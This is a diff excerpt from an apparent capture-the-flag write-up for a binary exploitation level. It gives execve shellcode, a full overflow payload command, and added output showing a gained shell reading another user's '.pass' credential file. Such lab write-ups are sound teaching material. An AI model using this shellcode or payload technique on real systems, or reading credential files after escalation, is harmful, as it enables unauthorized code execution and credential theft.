@@ -162,4 +162,10 @@ We now have enough information to try to get the flag, as we don't have any call
 __Shell code__ `'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'` that gives us a total of `24 bytes` we know the *offset* is 108 - 24 for the shell code and 4 for the address what leaves us with *80 bytes* of random characters
 ```
 ./level9 $(python -c "print '\x10\xa0\x04\x08' + 'A' * 80 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x0c\xa0\x04\x08'")
+
+$ whoami
+bonus0
+
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
